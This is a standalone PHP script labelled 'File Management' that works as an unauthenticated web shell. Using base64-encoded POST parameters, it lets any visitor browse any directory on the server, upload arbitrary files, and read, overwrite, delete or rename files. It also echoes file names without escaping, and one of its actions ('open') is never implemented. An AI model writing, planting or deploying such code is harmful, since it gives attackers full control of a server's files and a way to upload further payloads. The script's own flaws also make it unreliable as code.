<?php
$currentDir = isset($_POST['d']) && !empty($_POST['d']) ? base64_decode($_POST['d']) : getcwd();
$currentDir = str_replace("\\", "/", $currentDir);

$pathParts = explode("/", $currentDir);
echo "<div class=\"dir\">";
foreach ($pathParts as $k => $v) {
    if ($v == "" && $k == 0) {
        echo "<a href=\"javascript:void(0);\" onclick=\"postDir('/')\">/</a>";
        continue;
    }
    $dirPath = implode("/", array_slice($pathParts, 0, $k + 1));
    echo "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($dirPath) . "')\">$v</a>/";
}
echo "</div>";

if (isset($_POST['s']) && isset($_FILES['u']) && $_FILES['u']['error'] == 0) {
    $fileName = $_FILES['u']['name'];
    $tmpName = $_FILES['u']['tmp_name'];
    $destination = $currentDir . '/' . $fileName;
    if (move_uploaded_file($tmpName, $destination)) {
        echo "<script>alert('Upload successful!'); postDir('" . addslashes($currentDir) . "');</script>";
    } else {
        echo "<script>alert('Upload failed!');</script>";
    }
}

$items = scandir($currentDir);
if ($items !== false) {
    echo "<table>";
    echo "<tr><th>File/Folder Name</th><th>Size</th><th>Action</th></tr>";

    foreach ($items as $item) {
        if (!is_dir($currentDir . '/' . $item) || $item == '.' || $item == '..') continue;
        echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($currentDir . '/' . $item) . "')\">$item</a></td><td>--</td><td>NONE</td></tr>";
    }

    foreach ($items as $item) {
        if (!is_file($currentDir . '/' . $item)) continue;
        $size = filesize($currentDir . '/' . $item) / 1024;
        $size = $size >= 1024 ? round($size / 1024, 2) . 'MB' : round($size, 2) . 'KB';
        echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postOpen('" . addslashes($currentDir . '/' . $item) . "')\">$item</a></td><td>$size</td><td>"
            . "<a href=\"javascript:void(0);\" onclick=\"postDel('" . addslashes($currentDir . '/' . $item) . "')\" class=\"button1\">Delete</a>"
            . "<a href=\"javascript:void(0);\" onclick=\"postEdit('" . addslashes($currentDir . '/' . $item) . "')\" class=\"button1\">Edit</a>"
            . "<a href=\"javascript:void(0);\" onclick=\"postRen('" . addslashes($currentDir . '/' . $item) . "', '$item')\" class=\"button1\">Rename</a>"
            . "</td></tr>";
    }
    echo "</table>";
} else {
    echo "<p>Unable to read directory!</p>";
}

if (isset($_POST['del']) && !empty($_POST['del'])) {
    $filePath = base64_decode($_POST['del']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath) && unlink($filePath)) {
        echo "<script>alert('Delete successful!'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Delete failed or no permission!'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

if (isset($_POST['edit']) && !empty($_POST['edit'])) {
    $filePath = base64_decode($_POST['edit']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath)) {
        echo "<style>table{display:none;}</style>"
            . "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($fileDir) . "')\" class=\"button1\"><=Back</a>"
            . "<form method=\"post\">"
            . "<input type=\"hidden\" name=\"obj\" value=\"" . $_POST['edit'] . "\">"
            . "<input type=\"hidden\" name=\"d\" value=\"" . base64_encode($fileDir) . "\">"
            . "<textarea name=\"content\">" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>"
            . "<center><button type=\"submit\" name=\"save\" value=\"Submit\" class=\"button1\">Save</button></center>"
            . "</form>";
    }
}

if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
    $filePath = base64_decode($_POST['obj']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath)) {
        file_put_contents($filePath, $_POST['content']);
        echo "<script>alert('Edit successful!'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Edit failed or no permission!'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

if (isset($_POST['ren']) && !empty($_POST['ren'])) {
    $oldPath = base64_decode($_POST['ren']);
    $oldDir = dirname($oldPath);
    if (isset($_POST['new']) && !empty($_POST['new'])) {
        $newPath = $oldDir . '/' . $_POST['new'];
        if (file_exists($oldPath) && !file_exists($newPath) && rename($oldPath, $newPath)) {
            echo "<script>alert('Rename successful!'); postDir('" . addslashes($oldDir) . "');</script>";
        } else {
            echo "<script>alert('Rename failed!'); postDir('" . addslashes($oldDir) . "');</script>";
        }
    } else {
        echo "<form method=\"post\">"
            . "New name: <input name=\"new\" type=\"text\" value=\"\">"
            . "<input type=\"hidden\" name=\"ren\" value=\"" . $_POST['ren'] . "\">"
            . "<input type=\"hidden\" name=\"d\" value=\"" . base64_encode($oldDir) . "\">"
            . "<input type=\"submit\" value=\"Submit\">"
            . "</form>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Management</title>
    <style>
        table { border-collapse: collapse; margin: 20px auto; }
        th, td { border: 1px solid #000; padding: 8px; }
        .button1 { margin: 0 5px; padding: 5px 10px; }
        .dir { margin: 10px; }
        textarea { width: 100%; height: 400px; }
    </style>
    <script>
        function postDir(dir) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "d";
            input.value = btoa(dir);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        function postDel(path) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "del";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        function postEdit(path) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "edit";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        function postRen(path, name) {
            var newName = prompt("Enter new name:", name);
            if (newName) {
                var form = document.createElement("form");
                form.method = "post";
                form.action = "";
                var input1 = document.createElement("input");
                input1.type = "hidden";
                input1.name = "ren";
                input1.value = btoa(path);
                var input2 = document.createElement("input");
                input2.type = "hidden";
                input2.name = "new";
                input2.value = newName;
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);
                form.submit();
            }
        }

        function postOpen(path) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "open";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
    </script>
</head>
<body>
    <div class="dir">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="u">
            <input type="submit" name="s" value="Upload">
            <input type="hidden" name="d" value="<?php echo base64_encode($currentDir); ?>">
        </form>
    </div>
</body>
</html>
